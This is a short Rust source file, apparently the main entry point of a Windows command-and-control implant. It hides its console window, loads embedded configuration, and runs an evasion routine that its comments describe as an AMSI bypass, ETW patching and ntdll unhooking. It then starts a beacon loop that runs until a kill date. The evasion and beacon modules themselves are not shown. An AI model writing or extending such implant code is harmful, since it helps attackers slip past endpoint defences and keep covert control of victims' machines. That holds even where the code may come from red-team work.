#![windows_subsystem = "windows"]

mod beacon;
mod config;
mod core;
mod crypto;
mod transport;
mod utils;

use std::sync::Arc;

fn main() {
    // Initialize configuration from embedded compile-time values
    let config = Arc::new(config::Config::embedded());

    // Run evasion suite before anything else (AMSI bypass, ETW patch, ntdll unhooking)
    #[cfg(all(target_os = "windows", feature = "evasion"))]
    {
        utils::evasion::init();
    }

    // Start the beacon loop (runs forever until killdate or cleanup)
    beacon::run(config);
}
